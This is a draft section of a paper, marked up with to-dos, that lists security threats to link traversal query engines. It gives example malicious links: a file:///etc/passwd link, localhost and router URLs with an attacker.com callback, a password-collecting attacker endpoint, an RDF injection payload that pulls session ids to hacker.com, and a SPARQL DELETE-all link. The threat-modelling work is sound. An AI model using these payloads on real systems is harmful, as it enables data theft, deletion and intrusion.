## Data-driven Threats
{:#threats}

We list several security threats related to LTQP in the following categories:

* **Result Compromise**: Threats that lead to incorrect query results.
* **Malicious Linking**: Threats that cause links to be followed that cause unintended actions to be performed.
* **System Compromise**: Threats that cause the query engine to perform undesired operations.

### Result Compromise

#### Unauthorized statements

Carol defines a wrong name or bank account number for Alice
{:.todo}

### Malicious Linking

#### Local Linking

Links to URLs using the file scheme, such as `file:///etc/passwd`.
{:.todo}

Links to URLs on localhost, such as `http://localhost:1234/changePassword=123&callback=http://attacker.com/`.
{:.todo}

Links to URLs on LAN, such as `http://192.168.0.1/router/open-port=*`.
{:.todo}

#### Intermediate Result Leakage

**Depends on hybrid query execution**

Attacks in this category depend on the query engine to interpret certain URLs as queryable APIs,
which allows these APIs to collect intermediary query results.
The attacker in this case must have knowledge of the engine's query planner to intercept intermediary bindings.

Query over `http://my-private-data.org/passwords.ttl` and compromised TPF endpoint `http://attacker.com/?password=` (possible discovered via a link).
{:.todo}

#### Cross-Site Data Injection

Assuming a compromised API (`http://trusted.org/`) that is trusted by the user, but dynamically creates RDF responses based on URL parameters.
A malicious link to `http://trusted.org/?name=Bob". <> rdfs:seeAlso <http://hacker.com/getSessionIds>. <> foaf:name "abc`
could result in data injection and the query engine to follow a link to `http://hacker.com/getSessionIds`,
which may allow the attacker to steal the user's session id's.
{:.todo}

This is related to CORS
{:.todo}

#### Session Hijacking

Link to `http://my-sparql-endpoint?query=DELETE * WHERE { ?s ?p ?o }`, assuming that the user is actively authenticated for that endpoint during query execution.
{:.todo}

### System Compromise

#### Arbitrary Code Execution

e.g. JavaScript, which would be needed for dynamic HTML pages that inject JSON-LD, also leads to XSS
{:.todo}

#### Link Cycles

Links that cause a traversal cycle.
{:.todo}

#### System hogging

CPU/memory hogging, for example due to specifics of RDF serializations (long URLs, flaws in parsers, ...).
Or infinitely long documents
{:.todo}

#### Data Corruption

Crash due to syntax errors in documents
{:.todo}

#### Cross-query execution interaction

Potentially malicious interactions between parallel query executions.
For example, corruption or exploitation of shared caches.
{:.todo}
